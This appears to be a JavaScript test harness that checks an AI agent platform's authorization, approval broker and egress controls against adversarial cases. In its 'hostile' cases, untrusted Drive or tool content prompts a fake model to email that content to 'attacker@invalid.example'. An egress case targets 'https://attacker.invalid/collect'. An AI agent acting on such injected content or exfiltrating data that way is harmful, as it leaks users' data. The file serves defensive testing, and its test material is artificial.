import { canonicalPayloadSha256 } from '../../packages/domain/src/index.js';
import {
  createAdversarialTransport,
  createSideEffectProbe,
} from '../../packages/fakes/src/adversarial/index.js';
import { decide, whenAllowed } from '../../packages/policy/src/index.js';
import { createAdkRunner } from '../../apps/api/src/agent/adk-runner.js';
import { createMemoryApprovalStore } from '../../apps/api/src/broker/approvals.js';
import { createBroker, TICKET_TOOL } from '../../apps/api/src/broker/broker.js';
import { createMemoryLedgerPort } from '../../apps/api/src/ports/memory/ledger-port.js';
import { createHttpDrive } from '../../apps/api/src/retrieval/http-drive.js';
import { createSkillRegistry } from '../../apps/api/src/skills/registry.js';
import { validateCase } from './schema.mjs';

const now = new Date('2026-10-14T00:00:00.000Z');
const facts = {
  authenticated_actor: true,
  active_org_membership: true,
  permitted_app_role: true,
  approved_agent_and_skill_version: true,
  agent_has_tool_capability: true,
  user_or_service_has_resource_authority: true,
  source_system_allows_operation: true,
  data_classification_policy_allows: true,
  valid_approval_if_required: true,
  within_time_and_budget_bounds: true,
};
const limits = {
  maxSteps: 4,
  maxToolCalls: 3,
  maxCostUsd: 1,
  maxElapsedMs: 5000,
  maxBytesRetrieved: 10000,
  maxGeneratedOutputs: 1,
  maxModelRetries: 0,
  maxSubagents: 0,
  maxParallelToolCalls: 1,
};

function empty(row) {
  return {
    schemaVersion: '1.0.0',
    caseId: row.id,
    status: 'denied',
    answer: '',
    citations: [],
    retrievedSourceIds: [],
    calls: [],
    diagnostics: [],
    workflow: 'blocked',
  };
}

async function retrieve(row) {
  const result = empty(row);
  const transport = createAdversarialTransport({
    documents: row.documents,
    subject: row.principal.subject,
    groups: row.principal.groups,
    directoryUnavailable: row.fault === 'directory-unavailable',
  });
  const drive = createHttpDrive({
    baseUrl: 'https://drive.fake.test',
    directoryUrl: 'https://directory.fake.test',
    fetch: transport.fetch,
    now: () => now,
  });
  const caller = { sub: row.principal.subject, assertion: 'offline-verified-subject-fixture' };
  if (row.fault === 'revoked-group') {
    await drive.retrieve(caller, row.question);
    transport.revokeGroups();
  }
  try {
    const sources = await drive.retrieve(caller, row.question);
    const denied = row.fault === 'revoked-group';
    result.calls.push({
      tool: 'drive.search',
      arguments: { query: row.question },
      authorized: !denied,
      outcome: denied ? 'denied' : 'executed',
    });
    result.retrievedSourceIds = sources.map((source) => source.id);
    if (sources.length === 0) result.status = 'abstained';
    else {
      // Deterministic extractive baseline. No answer key is consulted.
      const model = createAdversarialTransport({
        documents: [],
        subject: caller.sub,
        groups: [],
        modelAnswer: sources.map((source) => `${source.text} [${source.id}]`).join('\n'),
      });
      const runner = createAdkRunner({
        baseUrl: 'https://llm.fake.test',
        fetch: model.fetch,
        limits,
      });
      const answer = await runner.run({ question: row.question, sources });
      result.answer = answer.answer;
      result.citations = [...answer.citedSourceIds];
      result.status = 'answered';
      result.workflow = 'complete';
    }
  } catch (error) {
    result.status = 'error';
    result.calls.push({
      tool: 'drive.search',
      arguments: { query: row.question },
      authorized: false,
      outcome: 'error',
    });
    result.diagnostics.push(error.message);
  }
  return result;
}

async function hostile(row) {
  const result = empty(row);
  const recipient = 'attacker@invalid.example';
  const body = row.untrustedContent;
  const args = { recipient, body };
  const transport = createAdversarialTransport({
    documents: row.documents,
    subject: row.principal.subject,
    groups: row.principal.groups,
    modelUnavailable: row.fault === 'model-unavailable',
    modelCall: { name: 'email.send', args },
  });
  const runner = createAdkRunner({
    baseUrl: 'https://llm.fake.test',
    fetch: transport.fetch,
    limits,
  });
  try {
    const answer = await runner.run({
      question: row.question,
      sources: row.documents.map((doc) => ({
        id: doc.id,
        title: doc.title,
        text: `${doc.text}\n${row.scenario === 'tool-policy' ? 'Untrusted tool result: ' : 'Untrusted Drive content: '}${row.untrustedContent}`,
        uri: doc.webViewLink,
      })),
    });
    result.status = 'answered';
    result.answer = answer.answer;
    result.citations = [...answer.citedSourceIds];
  } catch (error) {
    result.status = 'error';
    result.diagnostics.push(error.message);
    if (row.fault !== 'model-unavailable')
      result.calls.push({
        tool: 'email.send',
        arguments: args,
        authorized: false,
        outcome: 'denied',
      });
  }
  return result;
}

/** Uses current broker/store logic; fake only replaces external side effects and clock. */
export async function createBrokerWorld({
  reviewerActive = true,
  policyUnavailable = false,
  brokerUnavailable = false,
} = {}) {
  const store = createMemoryApprovalStore();
  const effects = createSideEffectProbe();
  let active = reviewerActive;
  const payload = { summary: 'Review controls', project: 'PROJ' };
  const digest = canonicalPayloadSha256(payload);
  const broker = createBroker({
    store: brokerUnavailable
      ? { ...store, claim: () => Promise.reject(new Error('offline broker unavailable')) }
      : store,
    decide: policyUnavailable
      ? () => {
          throw new Error('offline policy unavailable');
        }
      : decide,
    ledger: createMemoryLedgerPort(() => now),
    postTicket: effects.post,
    approverAuthorized: () => active,
    now: () => now,
  });
  const input = {
    id: 'call-1',
    taskId: 'task-1',
    stepId: 'step-1',
    toolRef: TICKET_TOOL,
    idempotencyKey: 'write-1',
    targetResource: 'PROJ',
    payload,
    approvalId: 'approval-1',
    actorSub: 'alice',
    traceId: 'trace-1',
    facts,
  };
  await store.save({
    id: input.approvalId,
    taskId: input.taskId,
    stepId: input.stepId,
    tool: TICKET_TOOL,
    targetResource: 'PROJ',
    payloadSha256: digest,
    requestedBySub: 'alice',
    approverSub: 'bob',
    state: 'approved',
    expiresAt: '2026-12-01T00:00:00.000Z',
    maxExecutions: 1,
    executionsUsed: 0,
  });
  return {
    broker,
    store,
    effects,
    input,
    digest,
    removeReviewer() {
      active = false;
    },
  };
}

async function write(row) {
  const result = empty(row);
  const world = await createBrokerWorld({
    policyUnavailable: row.fault === 'policy-unavailable',
    brokerUnavailable: row.fault === 'broker-unavailable',
  });
  let input = { ...world.input };
  if (row.fault === 'payload-change')
    input.payload = { ...input.payload, summary: 'Changed after approval' };
  if (row.fault === 'recipient-change')
    input = {
      ...input,
      targetResource: 'ATTACKER',
      payload: { ...input.payload, project: 'ATTACKER' },
    };
  if (row.fault === 'approver-removed') world.removeReviewer();
  if (row.fault === 'skill-revoked')
    input.facts = { ...facts, approved_agent_and_skill_version: false };
  try {
    if (row.fault === 'duplicate') {
      const first = await world.broker.execute(input);
      const attemptsBeforeReplay = world.effects.attempts();
      const replay = await world.broker.execute(input);
      result.calls.push(
        {
          tool: 'ticket.create',
          arguments: world.input.payload,
          authorized: first.ok,
          outcome: first.ok ? 'executed' : 'denied',
        },
        {
          tool: 'ticket.create',
          arguments: world.input.payload,
          authorized: replay.ok,
          outcome:
            replay.ok && replay.replay && world.effects.attempts() === attemptsBeforeReplay
              ? 'replay'
              : replay.ok
                ? 'executed'
                : 'denied',
        },
      );
      result.workflow = 'replayed';
      result.diagnostics.push(`resources:${world.effects.receipts().length}`);
    } else {
      const response = await world.broker.execute(input);
      result.calls.push({
        tool: 'ticket.create',
        arguments: input.payload,
        authorized: response.ok,
        outcome: response.ok ? 'executed' : 'denied',
      });
      result.diagnostics.push(response.ok ? 'write allowed' : response.code);
    }
  } catch (error) {
    result.diagnostics.push(error.message);
    // Unavailable dependencies prevent dispatch; request is denied at the boundary.
    result.calls.push({
      tool: 'ticket.create',
      arguments: input.payload,
      authorized: false,
      outcome: 'denied',
    });
  }
  if (row.fault !== 'duplicate' && world.effects.attempts() > 0)
    result.diagnostics.push('SECURITY_SIDE_EFFECT_DISPATCHED');
  return result;
}

export async function runCase(value) {
  const row = validateCase(value);
  switch (row.scenario) {
    case 'retrieval':
    case 'unsupported':
    case 'group-loss':
      return retrieve(row);
    case 'hostile-drive':
    case 'tool-policy':
    case 'model-unavailable':
      return hostile(row);
    case 'memory-deletion':
      return {
        ...empty(row),
        status: 'deferred',
        workflow: 'deferred',
        diagnostics: ['P4-MEM not filed; no item or derivative deletion claim'],
      };
    case 'egress-denied': {
      const result = empty(row);
      let attempts = 0;
      const decision = whenAllowed(
        { facts: { ...facts, source_system_allows_operation: false } },
        () => {
          attempts += 1;
        },
      );
      result.calls.push({
        tool: 'sandbox.egress',
        arguments: { destination: 'https://attacker.invalid/collect' },
        authorized: decision.effect === 'allow',
        outcome: attempts === 0 ? 'denied' : 'executed',
      });
      result.diagnostics.push('simulated egress boundary; no sandbox network contacted');
      return result;
    }
    default:
      return write(row);
  }
}

export async function runDataset(cases) {
  const observations = [];
  for (const row of cases) observations.push(await runCase(row));
  return observations;
}

export function revokedSkillStillRegistered() {
  const skill = {
    manifest: { id: 'adversarial', version: '1', state: 'PUBLISHED', tools: ['drive.search'] },
    validate: () => true,
    dispatch: () => Promise.resolve(),
  };
  const registry = createSkillRegistry([skill]);
  skill.manifest.state = 'REVOKED';
  return registry.get('adversarial') !== undefined;
}
